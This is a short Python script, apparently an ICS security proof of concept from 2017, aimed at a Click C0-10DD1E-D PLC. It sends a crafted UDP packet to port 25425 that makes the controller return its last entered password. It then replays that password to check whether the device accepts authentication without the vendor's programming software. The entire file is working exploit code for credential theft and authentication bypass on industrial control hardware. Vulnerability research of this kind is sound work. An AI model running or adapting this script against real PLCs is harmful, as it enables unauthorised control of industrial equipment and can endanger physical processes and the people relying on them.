#!/usr/bin/python
# ======================================================================
#
# password.py
#
# This script tests to see if the Click C0-10DD1E-D PLC will
# accept a password without the legitimate programming software.
#
# Authors: Gary Roth, Dan Ritter, Rich Tanner
# Date: March 2017
#
# ======================================================================

import socket
import binascii
import struct
import time
import sys
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP socket to send data out
rec = None  # holds received data from the Click PLC
srcIP = '192.168.0.20' # source IP address of sender
srcPort = random.randint(40000, 55000) # source port
dstIP = '192.168.0.101' # destination port of PLC
dstPort = 25425 # destination port

# Bind socket
sock.bind((srcIP, srcPort))

retrievepw = binascii.unhexlify("4b4f50003500d56f07004d01430010000a")

# Send password packet and check result
sock.sendto(retrievepw, (dstIP, dstPort))
rec = sock.recv(1024)
password = rec[-8:]
print "Last entered password: " + password

asc = ""
for c in password:
    asc += str(hex(ord(c)))

asc = asc.replace('0x0', '00')
asc = asc.replace('0x', '')
asc += "00"

password = binascii.unhexlify("4b4f50001600e73913004d01470010000b0b0200" + asc)

print "Sending password..."
sock.sendto(password, (dstIP, dstPort))
rec = sock.recv(1024)

if binascii.hexlify(rec) == "4b4f50001600f2f607004d01470010000b":
    print "Password accepted"
else:
    print "Password rejected"

